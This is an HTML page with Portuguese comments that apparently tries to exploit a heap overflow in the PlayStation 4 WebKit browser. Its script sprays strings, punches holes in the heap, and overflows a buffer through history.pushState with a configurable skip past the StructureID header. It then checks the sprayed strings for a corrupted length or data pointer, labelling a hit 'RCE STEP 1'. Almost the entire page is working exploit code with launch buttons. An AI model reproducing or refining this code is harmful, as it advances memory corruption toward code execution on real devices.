<!DOCTYPE html>
<html>
<head>
    <title>PS4 Header Skipper (StructureID Bypass)</title>
    <style>
        body { background-color: #000; color: #ff0; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 20px; padding: 20px; width: 100%; border: 2px solid #ff0; background: #222; color: #fff; cursor: pointer; margin-bottom: 10px;
        }
        #log { text-align: left; border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; }
    </style>
</head>
<body>

    <h1>Header Skipper (Evitando o StructureID)</h1>
    <p>Tentando corromper o vizinho sem tocar nos seus primeiros bytes vitais.</p>

    <button onclick="startSkipAttack(8)">PULAR 8 BYTES (Preserva ID)</button>
    <button onclick="startSkipAttack(16)">PULAR 16 BYTES (Preserva ID+Flags)</button>
    <button onclick="startSkipAttack(24)">PULAR 24 BYTES (Preserva Header WebKit)</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520; // O início exato do vizinho
        const OVERFLOW_AMT = 1024 * 64; 

        // Spray de Strings (Alvo mais provável para alinhamento)
        // Usamos strings de 128 bytes (pequenas/médias)
        const TARGET_SIZE = 128; 
        const SPRAY_COUNT = 5000;

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let color = type === 'win' ? '#0f0' : 'cyan';
            el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startSkipAttack(skipBytes) {
            log(`--- INICIANDO TESTE: PULAR ${skipBytes} BYTES ---`);
            
            // 1. SPRAY DE STRINGS
            victims = [];
            // Padding para string de 128 bytes
            const pad = "B".repeat(TARGET_SIZE - 24); 

            for(let i=0; i<SPRAY_COUNT; i++) {
                let s = [pad, i].join("").substring(0, TARGET_SIZE - 24);
                victims.push(s);
            }

            // 2. BURACOS
            for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
            await forceGC();

            // 3. EXPLOIT (COM PULO)
            log(`Disparando Overflow (Safe-Zone de ${skipBytes} bytes)...`);
            
            setTimeout(() => {
                try {
                    // Parte 1: Enche até a borda do vizinho (709.520)
                    let buffer = "A".repeat(BASE_OFFSET);
                    
                    // Parte 2: A ZONA NEUTRA (Pula o StructureID)
                    // Escrevemos 0x00 nos primeiros bytes do vizinho.
                    // Esperamos que 0x00 não cause crash imediato ou seja ignorado.
                    // \u0000 conta como 1 byte.
                    buffer += "\u0000".repeat(skipBytes); 
                    
                    // Parte 3: A CORRUPÇÃO (0x01)
                    // Agora sim escrevemos 0x01 para tentar pegar o Length ou Ponteiro de Dados
                    buffer += "\x01".repeat(OVERFLOW_AMT);

                    history.pushState({}, "skip_pwn", "/" + buffer);

                    log("Verificando strings...");
                    checkStrings();

                } catch (e) {
                    log("Erro: " + e.message);
                }
            }, 500);
        }

        function checkStrings() {
            let found = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                // Tenta detectar corrupção via Error.message (Técnica PSFree)
                try {
                    let err = new Error(s);
                    let val = err.message;
                    
                    // Se o tamanho mudou (porque atingimos o campo length depois do ID)
                    if (val.length !== s.length) {
                        log(`!!! SUCESSO !!! String ${i} Length Corrompido!`, 'win');
                        log(`Novo Tamanho: ${val.length}`, 'win');
                        alert("RCE STEP 1: LENGTH CORRUPTED!");
                        found = true;
                        break;
                    }
                    
                    // Se o conteúdo mudou (porque atingimos o ponteiro de dados)
                    if (val.charCodeAt(0) !== 66) { // 66 = 'B'
                        log(`!!! SUCESSO !!! String ${i} Ponteiro Corrompido!`, 'win');
                        alert("RCE STEP 1: POINTER CORRUPTED!");
                        found = true;
                        break;
                    }
                } catch(e) {}
            }
            if(!found) log("Nenhuma corrupção detectada.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 500));
        }
    </script>
</body>
</html>
